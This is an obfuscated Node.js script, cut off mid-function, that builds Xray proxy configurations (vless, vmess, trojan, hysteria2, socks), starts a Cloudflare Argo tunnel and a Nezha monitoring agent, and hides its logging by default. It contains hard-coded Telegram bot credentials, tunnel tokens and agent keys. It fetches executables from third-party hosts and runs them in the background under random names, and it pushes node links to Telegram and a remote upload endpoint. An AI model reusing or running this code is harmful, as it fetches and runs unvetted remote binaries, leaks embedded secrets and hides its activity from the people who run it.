#!/usr/bin/env node

const _0x3e3e40 = _0x60c6
;(function (_0x375c49, _0x95d43a) {
  const _0x52fda1 = _0x60c6,
    _0x5e6354 = _0x375c49()
  while (!![]) {
    try {
      const _0x346e1d =
        parseInt(_0x52fda1(0x1d3)) / 0x1 +
        parseInt(_0x52fda1(0x1b7)) / 0x2 +
        -parseInt(_0x52fda1(0x1ba)) / 0x3 +
        (parseInt(_0x52fda1(0x103)) / 0x4) * (-parseInt(_0x52fda1(0x102)) / 0x5) +
        parseInt(_0x52fda1(0x11b)) / 0x6 +
        parseInt(_0x52fda1(0x1a4)) / 0x7 +
        (-parseInt(_0x52fda1(0xe0)) / 0x8) * (parseInt(_0x52fda1(0x18c)) / 0x9)
      if (_0x346e1d === _0x95d43a) break
      else _0x5e6354['push'](_0x5e6354['shift']())
    } catch (_0x164b43) {
      _0x5e6354['push'](_0x5e6354['shift']())
    }
  }
})(_0x59e5, 0x9264b)
const http = require(_0x3e3e40(0xfb)),
  axios = require(_0x3e3e40(0x18a)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x3e3e40(0xd9)),
  crypto = require(_0x3e3e40(0xd5)),
  { promisify } = require(_0x3e3e40(0x132)),
  { exec: execCommand, execSync } = require(_0x3e3e40(0x171)),
  exec = promisify(execCommand),
  UPLOAD_URL = process[_0x3e3e40(0xd3)][_0x3e3e40(0x1f6)] || '',
  PROJECT_URL = process[_0x3e3e40(0xd3)][_0x3e3e40(0xf8)] || '',
  AUTO_ACCESS = process[_0x3e3e40(0xd3)][_0x3e3e40(0x1be)] || ![],
  FILE_PATH = process[_0x3e3e40(0xd3)]['FILE_PATH'] || '.npm',
  NEZHA_SERVER = process[_0x3e3e40(0xd3)][_0x3e3e40(0x1de)] || _0x3e3e40(0x108),
  NEZHA_PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0xd2)] || '',
  NEZHA_KEY = process[_0x3e3e40(0xd3)][_0x3e3e40(0x11e)] || _0x3e3e40(0x19b),
  UUID = process['env'][_0x3e3e40(0x1bd)] || _0x3e3e40(0x13f),
  ARGO_AUTH = process[_0x3e3e40(0xd3)][_0x3e3e40(0x176)] || _0x3e3e40(0xf3),
  ARGO_DOMAIN = process[_0x3e3e40(0xd3)][_0x3e3e40(0x1c6)] || 'deployzy.933993.xyz',
  ARGO_PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0x197)] || 0xe2e1,
  SUB_PATH = process['env'][_0x3e3e40(0x1d0)] || _0x3e3e40(0x16b),
  PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0x117)] || process[_0x3e3e40(0xd3)]['PORT'] || 0xbb8,
  S5_PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0xfd)] || '',
  HY2_PORT = process[_0x3e3e40(0xd3)]['HY2_PORT'] || '',
  REALITY_PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0x19e)] || '',
  NAME = process['env'][_0x3e3e40(0x1e7)] || _0x3e3e40(0xf0),
  CFIP = process[_0x3e3e40(0xd3)]['CFIP'] || _0x3e3e40(0x121),
  CFPORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0x192)] || 0x1bb,
  CHAT_ID = process[_0x3e3e40(0xd3)][_0x3e3e40(0x10d)] || _0x3e3e40(0x1ed),
  BOT_TOKEN = process[_0x3e3e40(0xd3)][_0x3e3e40(0x177)] || _0x3e3e40(0x156),
  SHOW_LOG = ![_0x3e3e40(0x1c5), 'disable', 'no'][_0x3e3e40(0x100)]((process['env']['SHOW_LOG'] || 'false')[_0x3e3e40(0x1c3)]())
!SHOW_LOG && ((console[_0x3e3e40(0x12d)] = () => {}), (console[_0x3e3e40(0xd1)] = () => {}))
function alwaysLog(_0x15461f) {
  const _0x54eae1 = _0x3e3e40
  process[_0x54eae1(0x123)]['write'](_0x15461f + '\x0a')
}
if (!fs['existsSync'](FILE_PATH)) fs[_0x3e3e40(0x13a)](FILE_PATH)
else {
}
function isValidPort(_0x3df177) {
  const _0x119226 = _0x3e3e40
  try {
    if (_0x3df177 === null || _0x3df177 === undefined || _0x3df177 === '') return ![]
    if (typeof _0x3df177 === _0x119226(0xdd) && _0x3df177[_0x119226(0x115)]() === '') return ![]
    const _0x4574c8 = parseInt(_0x3df177)
    if (isNaN(_0x4574c8)) return ![]
    if (_0x4574c8 < 0x1 || _0x4574c8 > 0xffff) return ![]
    return !![]
  } catch (_0x409acb) {
    return ![]
  }
}
function generateRandomName() {
  const _0x14ac71 = _0x3e3e40,
    _0x5bd56d = _0x14ac71(0xda)
  let _0x29195c = ''
  for (let _0x41976a = 0x0; _0x41976a < 0x6; _0x41976a++) {
    _0x29195c += _0x5bd56d[_0x14ac71(0x1ec)](Math[_0x14ac71(0xe2)](Math[_0x14ac71(0x1d7)]() * _0x5bd56d[_0x14ac71(0x1c2)]))
  }
  return _0x29195c
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x3e3e40(0x1b9)](FILE_PATH, npmName),
  phpPath = path[_0x3e3e40(0x1b9)](FILE_PATH, phpName),
  webPath = path[_0x3e3e40(0x1b9)](FILE_PATH, webName),
  botPath = path['join'](FILE_PATH, botName),
  subPath = path[_0x3e3e40(0x1b9)](FILE_PATH, _0x3e3e40(0x161)),
  listPath = path['join'](FILE_PATH, _0x3e3e40(0x1d1)),
  bootLogPath = path[_0x3e3e40(0x1b9)](FILE_PATH, 'boot.log'),
  configPath = path[_0x3e3e40(0x1b9)](FILE_PATH, _0x3e3e40(0x128)),
  certPath = path[_0x3e3e40(0x14c)](FILE_PATH, _0x3e3e40(0x1a3)),
  keyPath = path[_0x3e3e40(0x14c)](FILE_PATH, _0x3e3e40(0x15e))
function deleteNodes() {
  const _0x3e3e38 = _0x3e3e40
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x3e3e38(0x16a)](subPath)) return
    let _0x44d2ba
    try {
      _0x44d2ba = fs[_0x3e3e38(0x186)](subPath, 'utf-8')
    } catch {
      return null
    }
    const _0x373fd2 = Buffer['from'](_0x44d2ba, _0x3e3e38(0x125))[_0x3e3e38(0xe4)]('utf-8'),
      _0xb14da2 = _0x373fd2[_0x3e3e38(0x1e9)]('\x0a')[_0x3e3e38(0x1f3)]((_0x6c573e) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x3e3e38(0xfc)](_0x6c573e)
      )
    if (_0xb14da2['length'] === 0x0) return
    return (
      axios[_0x3e3e38(0x168)](UPLOAD_URL + '/api/delete-nodes', JSON[_0x3e3e38(0x109)]({ nodes: _0xb14da2 }), {
        headers: { 'Content-Type': 'application/json' }
      })[_0x3e3e38(0x12e)]((_0x406dca) => {
        return null
      }),
      null
    )
  } catch (_0x3ff5d8) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x489f67 = _0x3e3e40
  try {
    const _0x58f72e = fs[_0x489f67(0xee)](FILE_PATH)
    _0x58f72e[_0x489f67(0x12f)]((_0x198a2e) => {
      const _0x58ee6a = _0x489f67,
        _0x2afefc = path[_0x58ee6a(0x1b9)](FILE_PATH, _0x198a2e)
      try {
        const _0x141850 = fs[_0x58ee6a(0x104)](_0x2afefc)
        _0x141850[_0x58ee6a(0x1d8)]() && fs[_0x58ee6a(0x1bf)](_0x2afefc)
      } catch (_0x5753a2) {}
    })
  } catch (_0x267f88) {}
}
function generateX25519Keypair() {
  const _0x229b37 = _0x3e3e40,
    { publicKey: _0x1aabc6, privateKey: _0x202e39 } = crypto['generateKeyPairSync']('x25519'),
    _0x4ebd43 = _0x202e39[_0x229b37(0x17d)]({ type: _0x229b37(0x124), format: _0x229b37(0x1ae) })['subarray'](-0x20),
    _0x3c372e = _0x1aabc6[_0x229b37(0x17d)]({ type: _0x229b37(0x1f5), format: 'der' })[_0x229b37(0x1cd)](-0x20)
  return { privateKey: _0x4ebd43[_0x229b37(0xe4)](_0x229b37(0xdb)), publicKey: _0x3c372e[_0x229b37(0xe4)](_0x229b37(0xdb)) }
}
function generateOrLoadKeyPair() {
  const _0x25e20d = _0x3e3e40,
    _0x51cc1c = path[_0x25e20d(0x1b9)](FILE_PATH, _0x25e20d(0xe3))
  if (fs[_0x25e20d(0x16a)](_0x51cc1c)) {
    const _0x5017ad = fs[_0x25e20d(0x186)](_0x51cc1c, 'utf8'),
      _0x4ca7cd = _0x5017ad[_0x25e20d(0x153)](/PrivateKey:\s*(.*)/),
      _0x11d5e9 = _0x5017ad[_0x25e20d(0x153)](/PublicKey:\s*(.*)/)
    if (_0x4ca7cd && _0x11d5e9) {
      ;((privateKey = _0x4ca7cd[0x1][_0x25e20d(0x115)]()),
        (publicKey = _0x11d5e9[0x1][_0x25e20d(0x115)]()),
        console[_0x25e20d(0x12d)](_0x25e20d(0x101), privateKey),
        console[_0x25e20d(0x12d)]('Public\x20Key:', publicKey))
      return
    }
  }
  const _0x1e74cc = generateX25519Keypair()
  ;((privateKey = _0x1e74cc[_0x25e20d(0x170)]),
    (publicKey = _0x1e74cc[_0x25e20d(0x134)]),
    fs[_0x25e20d(0x19c)](_0x51cc1c, _0x25e20d(0x147) + privateKey + '\x0aPublicKey:\x20' + publicKey + '\x0a', _0x25e20d(0x1c4)),
    console[_0x25e20d(0x12d)]('Private\x20Key:', privateKey),
    console[_0x25e20d(0x12d)](_0x25e20d(0x131), publicKey))
}
function _0x60c6(_0x298702, _0x493885) {
  const _0x59e5a0 = _0x59e5()
  return (
    (_0x60c6 = function (_0x60c646, _0x3645dc) {
      _0x60c646 = _0x60c646 - 0xd1
      let _0x292f1d = _0x59e5a0[_0x60c646]
      return _0x292f1d
    }),
    _0x60c6(_0x298702, _0x493885)
  )
}
const FALLBACK_EC_KEY =
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a' +
    _0x3e3e40(0x14d) +
    _0x3e3e40(0x166) +
    _0x3e3e40(0x105) +
    _0x3e3e40(0x129) +
    _0x3e3e40(0x1e1) +
    _0x3e3e40(0x19a) +
    _0x3e3e40(0x1f2),
  FALLBACK_CERT =
    _0x3e3e40(0x172) +
    _0x3e3e40(0xf1) +
    _0x3e3e40(0x138) +
    _0x3e3e40(0x1da) +
    _0x3e3e40(0x1cc) +
    _0x3e3e40(0x198) +
    _0x3e3e40(0x135) +
    _0x3e3e40(0x1f7) +
    _0x3e3e40(0x119) +
    _0x3e3e40(0x127)
function ensureTlsCertificates(_0xb83258, _0x28ac72) {
  const _0x3e07ec = _0x3e3e40
  if (fs[_0x3e07ec(0x16a)](_0xb83258) && fs['existsSync'](_0x28ac72)) return
  fs[_0x3e07ec(0x13a)](path['dirname'](_0xb83258), { recursive: !![] })
  try {
    ;(execSync(_0x3e07ec(0x1e0), { stdio: _0x3e07ec(0x1df) }),
      execSync(_0x3e07ec(0x1eb) + _0x28ac72 + '\x22', { stdio: _0x3e07ec(0x1df) }),
      execSync(_0x3e07ec(0x178) + _0x28ac72 + _0x3e07ec(0x182) + _0xb83258 + _0x3e07ec(0xeb), { stdio: _0x3e07ec(0x1df) }))
    return
  } catch (_0x284339) {}
  ;(fs[_0x3e07ec(0x19c)](_0x28ac72, FALLBACK_EC_KEY), fs['writeFileSync'](_0xb83258, FALLBACK_CERT))
}
function _0x59e5() {
  const _0x1ced02 = [
    'MarkdownV2',
    'readFileSync',
    'password',
    'createHash',
    'raw',
    'axios',
    '&type=tcp&headerType=none#',
    '517365QjmPpp',
    'http://ipv6.ip.sb',
    '2096',
    'trojan',
    'tcp',
    'https://api.ip.sb/geoip',
    'CFPORT',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
    'Error\x20executing\x20command:\x20',
    'ARGO_PORT',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    '\x0asocks://',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    '59f7oe2oSVOPBD36P6j7BCBLcT5VrdEt',
    'writeFileSync',
    '/vless-argo',
    'REALITY_PORT',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    'blackhole',
    'success',
    'data',
    'cert.pem',
    '2951599BSIPAp',
    'arm',
    'country_code',
    '\x20-p\x20',
    'Not\x20Found',
    'Error\x20in\x20startserver:',
    'reality',
    'amd',
    'status',
    'https://arm64.oooen.com',
    'der',
    '\x0a\x0atrojan://',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'unlink',
    'basename',
    'vless-in',
    '\x22\x20>\x20/dev/null\x202>&1',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'boot.log',
    '1837450fLoGvL',
    'listen',
    'join',
    '3341760BaLgjQ',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'digest',
    'UUID',
    'AUTO_ACCESS',
    'unlinkSync',
    'TunnelSecret',
    '\x20is\x20running',
    'length',
    'toLowerCase',
    'utf8',
    'false',
    'ARGO_DOMAIN',
    'slice',
    'ARGO_DOMAIN:',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'Empowerment\x20success\x20for\x20',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'subarray',
    'fileUrls',
    'hysteria',
    'SUB_PATH',
    'list.txt',
    'http://ip-api.com/json',
    '267174lewNyv',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'App\x20is\x20running',
    'writeHead',
    'random',
    'isFile',
    '/dev/null',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    '\x22\x20run',
    'vless',
    '\x0avless://',
    'NEZHA_SERVER',
    'ignore',
    'openssl\x20version',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'www.iij.ad.jp:443',
    '/api/add-subscriptions',
    'tls',
    'xtls-rprx-vision',
    'rm\x20-rf\x20',
    'NAME',
    'nohup\x20\x22',
    'split',
    'true',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'charAt',
    '7575949494',
    '/vmess-argo?ed=2560',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    '/agent',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'filter',
    'application/json',
    'spki',
    'UPLOAD_URL',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    'error',
    'NEZHA_PORT',
    'env',
    'auto',
    'crypto',
    '2083',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    'path',
    'abcdefghijklmnopqrstuvwxyz',
    'base64url',
    'none',
    'string',
    '/sub.txt\x20saved\x20successfully',
    'from',
    '24zpZmIB',
    'hysteria-in',
    'floor',
    'key.txt',
    'toString',
    'nohup\x20',
    '?security=tls&sni=',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    '\x0a\x20\x20credentials-file:\x20',
    'taskkill\x20/f\x20/im\x20',
    '节点推送**\x0a```',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    'vless-tcp-in',
    '2087',
    'readdirSync',
    'firefox',
    'js-node',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'response',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
    'Subscription\x20uploaded\x20successfully',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    'arch',
    '2053',
    'PROJECT_URL',
    'https+local://8.8.8.8/dns-query',
    '.download',
    'http',
    'test',
    'S5_PORT',
    'text/html;\x20charset=utf-8',
    'platform',
    'includes',
    'Private\x20Key:',
    '256210rbNzUT',
    '68ULYKTw',
    'statSync',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'createServer',
    '\x0a\x20\x20\x20\x20',
    'nezha.933993.xyz:443',
    'stringify',
    'substring',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'https://api.telegram.org/bot',
    'CHAT_ID',
    '8443',
    'has',
    'createWriteStream',
    '&fp=firefox&type=ws&host=',
    '\x20failed:\x20',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'index.html',
    'trim',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'SERVER_PORT',
    '?encryption=none&security=tls&sni=',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    '\x20-s\x20',
    '6897360gtRxlj',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    'get',
    'NEZHA_KEY',
    'npm\x20running\x20error:\x20',
    'unshift',
    'mfa.gov.ua',
    'Download\x20',
    'stdout',
    'pkcs8',
    'base64',
    '127.0.0.1',
    '-----END\x20CERTIFICATE-----\x0a',
    'config.json',
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
    '/vmess-argo',
    'url',
    '/web',
    'log',
    'catch',
    'forEach',
    'tunnel.json',
    'Public\x20Key:',
    'util',
    'http\x20server\x20is\x20running\x20on\x20',
    'publicKey',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    '/v1',
    'pkill\x20-f\x20\x22[',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'renameSync',
    'mkdirSync',
    'end',
    'Error\x20downloading\x20files:',
    'automatic\x20access\x20task\x20added\x20successfully',
    'then',
    '180233cd-22c9-4144-a559-012e45986dd6',
    'trojan-ws-in',
    'push',
    'utf-8',
    '.exe\x20>\x20nul\x202>&1',
    '/trojan-argo',
    'sha256',
    'http://ipv4.ip.sb',
    'PrivateKey:\x20',
    '&pinSHA256=',
    '\x20>/dev/null\x202>&1\x20&',
    'tunnel.yml',
    'message',
    'resolve',
    'BggqhkjOPQMBBw==\x0a',
    'Failed\x20to\x20get\x20IP\x20address:',
    'vless-ws-in',
    'win32',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    'close',
    'match',
    'proxy',
    'replace',
    '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
    'toUpperCase',
    'update',
    'now',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    '\x5c$&',
    'org',
    'https://amd64.ssss.nyc.mn',
    'private.key',
    '\x20from\x20backup\x20source',
    '--tls',
    'sub.txt',
    'web\x20running\x20error:\x20',
    'Unhandled\x20error\x20in\x20startserver:',
    'config.yaml',
    'Mozilla/5.0',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    'post',
    'aarch64',
    'existsSync',
    '800',
    'fileName',
    'Telegram\x20message\x20sent\x20successfully',
    'vmess-ws-in',
    '/bot',
    'privateKey',
    'child_process',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'inbounds',
    'text/plain;\x20charset=utf-8',
    'Retrying\x20',
    'ARGO_AUTH',
    'BOT_TOKEN',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    '\x20>/dev/null\x202>&1',
    '/api/add-nodes',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'all',
    'export',
    'Unknown',
    'php\x20running\x20error:\x20',
    'arm64',
    'clear',
    '\x22\x20-out\x20\x22',
    'finish',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.'
  ]
  _0x59e5 = function () {
    return _0x1ced02
  }
  return _0x59e5()
}
function getCertificateFingerprint(_0x392f59) {
  const _0x241c33 = _0x3e3e40
  try {
    const _0x4461ff = execSync('openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22' + _0x392f59 + '\x22', {
        encoding: _0x241c33(0x1c4),
        timeout: 0xbb8
      })[_0x241c33(0x115)](),
      _0x43de57 = _0x4461ff[_0x241c33(0x153)](/=(.+)$/)
    if (_0x43de57 && _0x43de57[0x1]) return _0x43de57[0x1][_0x241c33(0x157)]()
  } catch (_0x3ceb49) {}
  try {
    const _0x36b2e5 = fs['readFileSync'](_0x392f59, 'utf8'),
      _0x214e13 = _0x36b2e5['match'](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x214e13) return ''
    const _0x9aa42d = _0x214e13[0x1][_0x241c33(0x155)](/\s/g, ''),
      _0x42169e = Buffer[_0x241c33(0xdf)](_0x9aa42d, 'base64'),
      _0x2aee18 = crypto[_0x241c33(0x188)](_0x241c33(0x145))[_0x241c33(0x158)](_0x42169e)[_0x241c33(0x1bc)]('hex')
    return _0x2aee18[_0x241c33(0x153)](/.{2}/g)[_0x241c33(0x1b9)](':')[_0x241c33(0x157)]()
  } catch (_0x4e229e) {
    return (console['error'](_0x241c33(0x194), _0x4e229e), '')
  }
}
async function generateConfig() {
  const _0x16f6d8 = _0x3e3e40,
    _0x3e2e0a = {
      log: { access: _0x16f6d8(0x1d9), error: _0x16f6d8(0x1d9), loglevel: _0x16f6d8(0xdc) },
      inbounds: [
        {
          tag: 'vless-fallback-in',
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x16f6d8(0x1dc),
          settings: {
            clients: [{ id: UUID, flow: _0x16f6d8(0x1e5) }],
            decryption: _0x16f6d8(0xdc),
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x16f6d8(0x19d), dest: 0xbba },
              { path: _0x16f6d8(0x12a), dest: 0xbbb },
              { path: _0x16f6d8(0x144), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x16f6d8(0x190) }
        },
        {
          tag: _0x16f6d8(0xec),
          port: 0xbb9,
          listen: _0x16f6d8(0x126),
          protocol: _0x16f6d8(0x1dc),
          settings: { clients: [{ id: UUID }], decryption: _0x16f6d8(0xdc) },
          streamSettings: { network: _0x16f6d8(0x190), security: _0x16f6d8(0xdc) }
        },
        {
          tag: _0x16f6d8(0x14f),
          port: 0xbba,
          listen: _0x16f6d8(0x126),
          protocol: _0x16f6d8(0x1dc),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x16f6d8(0xdc) },
          streamSettings: { network: 'ws', security: _0x16f6d8(0xdc), wsSettings: { path: _0x16f6d8(0x19d) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x16f6d8(0x1e4), 'quic'], metadataOnly: ![] }
        },
        {
          tag: _0x16f6d8(0x16e),
          port: 0xbbb,
          listen: '127.0.0.1',
          protocol: 'vmess',
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x16f6d8(0x12a) } },
          sniffing: { enabled: !![], destOverride: [_0x16f6d8(0xfb), _0x16f6d8(0x1e4), 'quic'], metadataOnly: ![] }
        },
        {
          tag: _0x16f6d8(0x140),
          port: 0xbbc,
          listen: _0x16f6d8(0x126),
          protocol: _0x16f6d8(0x18f),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: 'none', wsSettings: { path: _0x16f6d8(0x144) } },
          sniffing: { enabled: !![], destOverride: [_0x16f6d8(0xfb), _0x16f6d8(0x1e4), 'quic'], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x16f6d8(0xf9)] },
      outbounds: [
        { protocol: 'freedom', tag: 'direct' },
        { protocol: _0x16f6d8(0x1a0), tag: 'block' }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x3e2e0a[_0x16f6d8(0x173)]['push']({
      tag: _0x16f6d8(0x1b3),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: 'vless',
      settings: { clients: [{ id: UUID, flow: _0x16f6d8(0x1e5) }], decryption: _0x16f6d8(0xdc) },
      streamSettings: {
        network: _0x16f6d8(0x189),
        security: _0x16f6d8(0x1aa),
        realitySettings: { show: ![], dest: _0x16f6d8(0x1e2), xver: 0x0, serverNames: ['www.iij.ad.jp'], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x3e2e0a['inbounds']['push']({
        tag: _0x16f6d8(0xe1),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x16f6d8(0x1cf),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x16f6d8(0x1cf),
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x16f6d8(0x154), url: 'https://bing.com' } },
          security: _0x16f6d8(0x1e4),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x3e2e0a['inbounds'][_0x16f6d8(0x141)]({
        tag: 's5-in',
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: 'socks',
        settings: { auth: _0x16f6d8(0x187), accounts: [{ user: UUID[_0x16f6d8(0x10a)](0x0, 0x8), pass: UUID['slice'](-0xc) }], udp: !![] }
      }),
    fs[_0x16f6d8(0x19c)](path['join'](FILE_PATH, _0x16f6d8(0x128)), JSON[_0x16f6d8(0x109)](_0x3e2e0a, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x3b039b = _0x3e3e40,
    _0x146b53 = os[_0x3b039b(0xf6)]()
  return _0x146b53 === _0x3b039b(0x1a5) || _0x146b53 === _0x3b039b(0x180) || _0x146b53 === _0x3b039b(0x169) ? _0x3b039b(0x1a5) : _0x3b039b(0x1ab)
}
function downloadFile(_0x1388ae, _0x3f2390, _0x3830e6) {
  const _0x4d6b4d = _0x3e3e40,
    _0x71180d = _0x1388ae,
    _0x98a427 = _0x71180d + _0x4d6b4d(0xfa)
  !fs[_0x4d6b4d(0x16a)](FILE_PATH) && fs['mkdirSync'](FILE_PATH, { recursive: !![] })
  const _0x314aca = fs[_0x4d6b4d(0x110)](_0x98a427)
  axios({ method: 'get', url: _0x3f2390, responseType: 'stream' })
    [_0x4d6b4d(0x13e)]((_0xb03ccf) => {
      const _0x1bb0d1 = _0x4d6b4d
      ;(_0xb03ccf['data']['pipe'](_0x314aca),
        _0x314aca['on'](_0x1bb0d1(0x183), () => {
          const _0xe5020a = _0x1bb0d1
          _0x314aca[_0xe5020a(0x152)]((_0x513be4) => {
            const _0x34dac5 = _0xe5020a
            if (_0x513be4) {
              const _0x459379 = _0x34dac5(0x122) + path[_0x34dac5(0x1b2)](_0x71180d) + _0x34dac5(0x112) + _0x513be4['message']
              ;(fs[_0x34dac5(0x1b1)](_0x98a427, () => {}), console[_0x34dac5(0xd1)](_0x459379), _0x3830e6(_0x459379))
              return
            }
            try {
              fs[_0x34dac5(0x139)](_0x98a427, _0x71180d)
            } catch (_0x236a17) {
              const _0x444c37 = _0x34dac5(0x122) + path[_0x34dac5(0x1b2)](_0x71180d) + '\x20failed:\x20' + _0x236a17[_0x34dac5(0x14b)]
              ;(fs[_0x34dac5(0x1b1)](_0x98a427, () => {}), console['error'](_0x444c37), _0x3830e6(_0x444c37))
              return
            }
            ;(console['log'](_0x34dac5(0x122) + path[_0x34dac5(0x1b2)](_0x71180d) + '\x20successfully'), _0x3830e6(null, _0x71180d))
          })
        }),
        _0x314aca['on'](_0x1bb0d1(0xd1), (_0x32f5db) => {
          const _0x53c06c = _0x1bb0d1
          fs[_0x53c06c(0x1b1)](_0x98a427, () => {})
          const _0xdc43b0 = _0x53c06c(0x122) + path[_0x53c06c(0x1b2)](_0x71180d) + _0x53c06c(0x112) + _0x32f5db[_0x53c06c(0x14b)]
          ;(console[_0x53c06c(0xd1)](_0xdc43b0), _0x3830e6(_0xdc43b0))
        }))
    })
    ['catch']((_0x1de6b4) => {
      const _0x1851fb = _0x4d6b4d
      fs['unlink'](_0x98a427, () => {})
      const _0x260943 = 'Download\x20' + path[_0x1851fb(0x1b2)](_0x71180d) + _0x1851fb(0x112) + _0x1de6b4[_0x1851fb(0x14b)]
      ;(console[_0x1851fb(0xd1)](_0x260943), _0x3830e6(_0x260943))
    })
}
async function downloadFilesAndRun() {
  const _0x3cf65e = _0x3e3e40,
    _0x5304c3 = getSystemArchitecture(),
    _0x11b60e = getFilesForArchitecture(_0x5304c3)
  if (_0x11b60e['length'] === 0x0) {
